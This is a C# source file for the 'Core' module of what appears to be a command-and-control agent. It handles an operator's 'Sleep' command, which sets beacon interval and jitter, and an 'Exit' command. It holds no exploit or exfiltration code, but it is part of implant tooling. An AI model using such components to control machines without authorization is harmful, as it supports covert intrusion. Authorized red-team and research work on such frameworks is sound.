using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Shared.Models;

using System;
using System.Collections.Generic;
using System.Linq;

namespace Agent.Modules
{
    public class CoreModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "Core",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "Sleep",
                        Delegate = SetSleep
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Exit",
                        Delegate = ExitAgent
                    }
                }
            };
        }

        void SetSleep(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;

                var interval = parameters.FirstOrDefault(p => p.Name.Equals("Interval", StringComparison.OrdinalIgnoreCase)).Value;

                if (interval != null)
                {
                    Config.Set(AgentConfig.SleepInterval, (int)interval);
                }

                var jitter = parameters.FirstOrDefault(p => p.Name.Equals("Jitter", StringComparison.OrdinalIgnoreCase)).Value;

                if (jitter != null)
                {
                    Config.Set(AgentConfig.SleepJitter, (int)jitter);
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ExitAgent(string AgentID, C2Data C2Data)
        {
            Agent.Stop();
        }
    }
}